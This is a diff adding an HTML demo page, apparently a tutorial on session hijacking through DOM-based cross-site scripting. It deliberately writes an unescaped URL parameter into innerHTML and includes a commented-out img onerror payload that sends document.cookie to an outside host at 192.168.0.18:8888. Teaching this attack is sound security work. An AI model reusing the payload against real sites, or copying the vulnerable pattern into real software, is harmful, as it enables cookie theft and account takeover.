@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>user session hijacking</title>
+</head>
+<body>
+    <!-- Vulnerable Code -->
+<div>
+    Welcome, <span id="username"></span>!
+</div>
+<script>
+    // Cookie set by us from frontend (generally it is done using backend)
+ // Function to set a cookie, mostly this will be set from server
+ function setCookie(name, value, days) {
+ const date = new Date();
+ date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+ const expires = "expires=" + date.toUTCString();
+ document.cookie = name + "=" + value + ";" + expires + ";path=/";
+ }
+ // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7
+ setCookie("exampleCookie", "Hello, Cookie!", 7);
+</script>
+<!-- Vulnerable Code -->
+<script>
+ const params = new URLSearchParams(window.location.search);
+ const name = params.get('name');
+ document.getElementById('username').innerHTML = `${name}`;
+</script>
+
+
+<!-- Passing name in url -->
+<!-- Image tag -->
+
+<!-- <img src="does-not-exist" onerror="var img = document.createElement(\`img\`); img.src=\'htt 
+p://192.168.0.18:8888/cookie?data=\' + document.cookie; document.querySelector(\'body\').appen
+dChild(img);"> -->
+
+<!-- encodeURIComponent()
+The  encodeURIComponent()  function encodes a URI by replacing each instance of certain characters by one, two, three, or four
+escape sequences representing the UTF-8 encoding of the character -->
+
+<!-- We knew image does not exist. We passed onerror function which consists our malicios url and we pass cookie in that url. -->
+<!-- As you can see we passed the cookie(that we saved from frontend-screenshot above) in malicious url. Now the attacker -->
+<!-- can use that cookie to do all unwanted things. -->
+
+</body>
+</html>
